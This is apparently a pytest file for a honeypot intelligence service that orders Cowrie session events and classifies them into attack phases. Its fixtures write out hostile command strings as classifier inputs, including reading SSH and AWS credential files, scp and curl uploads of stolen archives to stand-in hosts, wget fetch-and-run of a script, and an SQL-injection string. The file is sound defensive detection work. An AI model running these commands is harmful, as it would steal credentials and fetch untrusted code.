"""Event ordering and behavior reconstruction (FR-006; ADR-024 D1, D4)."""

from __future__ import annotations

import itertools
import random
from datetime import UTC, datetime, timedelta
from typing import get_args

import pytest

from aitl_common.config.schemas.intel import PhaseRules
from aitl_common.config.vocabulary import BehaviorPhase
from intel_service.events import NormalizedEvent
from intel_service.reconstruction import (
    PHASE_ORDER,
    Behavior,
    order_events,
    phases_of,
    reconstruct,
)
from intel_service.sanitize import sanitize

T0 = datetime(2025, 3, 1, 10, 0, 0, tzinfo=UTC)


def ev(
    raw_id: int,
    at: int | datetime = 0,
    text: str = "",
    event_type: str = "command_input",
) -> NormalizedEvent:
    occurred = at if isinstance(at, datetime) else T0 + timedelta(seconds=at)
    sanitized = sanitize(text)
    return NormalizedEvent(
        raw_record_id=raw_id,
        source_type="synthetic",
        cowrie_session_id="a1b2c3d4e5f60001",
        event_type=event_type,
        occurred_at=occurred,
        raw_text=sanitized.raw,
        normalized_text=sanitized.normalized,
        truncated=sanitized.truncated,
        username=None,
        attempted_secret=None,
        artifact_sha256=None,
        src_ip="203.0.113.7",
        src_port=None,
    )


def seqs(events: list[NormalizedEvent]) -> dict[int, int]:
    return {s.event.raw_record_id: s.seq for s in order_events(events)}


# --- D1 ordering ------------------------------------------------------------------------


def test_different_timestamps_order_chronologically() -> None:
    assert seqs([ev(1, 30), ev(2, 10), ev(3, 20)]) == {2: 1, 3: 2, 1: 3}


def test_identical_timestamps_order_by_raw_record_id() -> None:
    assert seqs([ev(9, 5), ev(3, 5), ev(7, 5), ev(1, 0)]) == {1: 1, 3: 2, 7: 3, 9: 4}


def test_microsecond_resolution_orders_before_raw_record_id() -> None:
    earlier = T0 + timedelta(microseconds=1)
    assert seqs([ev(1, earlier + timedelta(microseconds=1)), ev(2, earlier)]) == {2: 1, 1: 2}


def test_input_order_never_matters() -> None:
    """Database read/insertion order and file order reach reconstruction only as input order."""
    events = [ev(i, at=(i * 7) % 5, text=f"cmd{i}") for i in range(1, 9)]
    expected = seqs(events)
    for permutation in itertools.islice(itertools.permutations(events), 2000):
        assert seqs(list(permutation)) == expected


def test_attacker_text_cannot_change_seq() -> None:
    base = [ev(1, 5, "aaa"), ev(2, 5, "zzz"), ev(3, 5, "mmm")]
    hostile = [ev(1, 5, "\uffff" * 50), ev(2, 5, ""), ev(3, 5, "'; DROP TABLE x; --")]
    assert seqs(base) == seqs(hostile) == {1: 1, 2: 2, 3: 3}


def test_seq_is_dense_from_one() -> None:
    ordered = order_events([ev(i, 100 - i) for i in range(1, 51)])
    assert [s.seq for s in ordered] == list(range(1, 51))


def test_duplicate_staging_identity_fails_closed() -> None:
    with pytest.raises(ValueError, match="duplicate raw_record_id"):
        order_events([ev(1, 0), ev(1, 1)])


# --- phase matching (P2 phase_rules_v1 semantics) ------------------------------------------


@pytest.mark.parametrize(
    ("event", "phases"),
    [
        (ev(1, event_type="session_connect"), ("scanning",)),
        (ev(1, event_type="client_version", text="SSH-2.0-Go"), ("scanning",)),
        (ev(1, event_type="login_failed", text="root"), ("credential_probing",)),
        (ev(1, text="uname -a"), ("discovery",)),
        (ev(1, text="cat /etc/passwd"), ("discovery",)),
        (ev(1, text="cat ~/.ssh/id_rsa"), ("credential_file_access",)),
        (ev(1, text="cat\t~/.aws/credentials"), ("credential_file_access",)),
        (ev(1, text="tar czf /tmp/.d.tgz /home"), ("collection",)),
        (ev(1, text="scp ~/.ssh/id_rsa x@198.51.100.20:/d/"), ("exfiltration_attempt",)),
        (
            ev(1, text="curl -T /tmp/.d.tgz http://h/u"),
            ("exfiltration_attempt", "ingress_transfer"),
        ),
        (ev(1, text="wget http://h/x.sh"), ("ingress_transfer",)),
        (ev(1, event_type="file_download", text="http://h/x.sh"), ("ingress_transfer",)),
        (ev(1, text="./x.sh"), ("execution",)),
        (ev(1, text="chmod +x x.sh"), ("execution",)),
        (ev(1, event_type="session_closed"), ("unclassified",)),
        (ev(1, event_type="other"), ("unclassified",)),
        (ev(1, text="lscpu-extra"), ("unclassified",)),
        (ev(1, text=""), ("unclassified",)),
        # Tokens are exact: no substring, case-folding or path interpretation.
        (ev(1, text="UNAME -a"), ("unclassified",)),
        (ev(1, text="xuname"), ("unclassified",)),
        (ev(1, text="cat ../../../../root/.ssh/id_rsa"), ("unclassified",)),
        # Command rules never fire on non-command events whose text looks like one.
        (ev(1, event_type="client_version", text="uname -a"), ("scanning",)),
        (ev(1, event_type="login_failed", text="wget"), ("credential_probing",)),
    ],
)
def test_phase_rule_semantics(
    phase_rules: PhaseRules, event: NormalizedEvent, phases: tuple[str, ...]
) -> None:
    assert phases_of(event, phase_rules) == phases


def test_phase_order_is_the_behavior_phase_enum() -> None:
    assert get_args(BehaviorPhase) == PHASE_ORDER
    assert PHASE_ORDER[-1] == "unclassified"


# --- D4 behavior grouping -------------------------------------------------------------------


def behaviors(
    events: list[NormalizedEvent], rules: PhaseRules
) -> list[tuple[int, str, tuple[int, ...]]]:
    return [(b.ordinal, b.phase, b.event_seqs) for b in reconstruct(order_events(events), rules)]


def test_one_phase(phase_rules: PhaseRules) -> None:
    assert behaviors([ev(1, 0, "uname -a"), ev(2, 1, "id")], phase_rules) == [
        (1, "discovery", (1, 2))
    ]


def test_multiple_phases_in_first_occurrence_order(phase_rules: PhaseRules) -> None:
    events = [
        ev(1, 0, event_type="session_connect"),
        ev(2, 1, "root", event_type="login_success"),
        ev(3, 2, "uname -a"),
        ev(4, 3, "tar czf a.tgz x"),
        ev(5, 4, event_type="session_closed"),
    ]
    assert behaviors(events, phase_rules) == [
        (1, "scanning", (1,)),
        (2, "credential_probing", (2,)),
        (3, "discovery", (3,)),
        (4, "collection", (4,)),
        (5, "unclassified", (5,)),
    ]


def test_repeated_non_contiguous_phase_is_one_behavior(phase_rules: PhaseRules) -> None:
    events = [ev(1, 0, "uname -a"), ev(2, 1, "tar czf a.tgz x"), ev(3, 2, "id")]
    assert behaviors(events, phase_rules) == [(1, "discovery", (1, 3)), (2, "collection", (2,))]


def test_event_in_several_phases_links_to_each(phase_rules: PhaseRules) -> None:
    events = [ev(1, 0, "wget http://h/x"), ev(2, 1, "curl -T f http://h/u")]
    assert behaviors(events, phase_rules) == [
        (1, "ingress_transfer", (1, 2)),
        (2, "exfiltration_attempt", (2,)),
    ]


def test_same_seq_phase_tie_uses_enum_order(phase_rules: PhaseRules) -> None:
    # exfiltration_attempt precedes ingress_transfer in the behavior_phase enum.
    assert behaviors([ev(1, 0, "curl -T f http://h/u")], phase_rules) == [
        (1, "exfiltration_attempt", (1,)),
        (2, "ingress_transfer", (1,)),
    ]


def test_behavior_interval_spans_its_events(phase_rules: PhaseRules) -> None:
    events = [ev(1, 0, "uname -a"), ev(2, 5, "tar czf a x"), ev(3, 9, "id")]
    discovery = reconstruct(order_events(events), phase_rules)[0]
    assert discovery == Behavior(1, "discovery", T0, T0 + timedelta(seconds=9), (1, 3))


def test_no_event_is_lost(phase_rules: PhaseRules) -> None:
    """FR-006: every event maps to at least one behavior."""
    texts = ["uname", "zzz", "curl -T a b", "", "./x", "cat ~/.ssh/k", "nc 1 2", "tar c"]
    events = [ev(i, i, t) for i, t in enumerate(texts, start=1)]
    covered = {seq for b in reconstruct(order_events(events), phase_rules) for seq in b.event_seqs}
    assert covered == set(range(1, len(texts) + 1))


def test_reconstruction_is_deterministic_under_shuffling(phase_rules: PhaseRules) -> None:
    rng = random.Random(42)  # noqa: S311 - deterministic test ordering
    vocabulary = ["uname -a", "wget u", "curl -T a b", "tar c", "./x", "zzz", "cat ~/.aws/c"]
    events = [ev(i, rng.randint(0, 5), rng.choice(vocabulary)) for i in range(1, 40)]
    expected = reconstruct(order_events(events), phase_rules)
    for _ in range(200):
        rng.shuffle(events)
        assert reconstruct(order_events(events), phase_rules) == expected
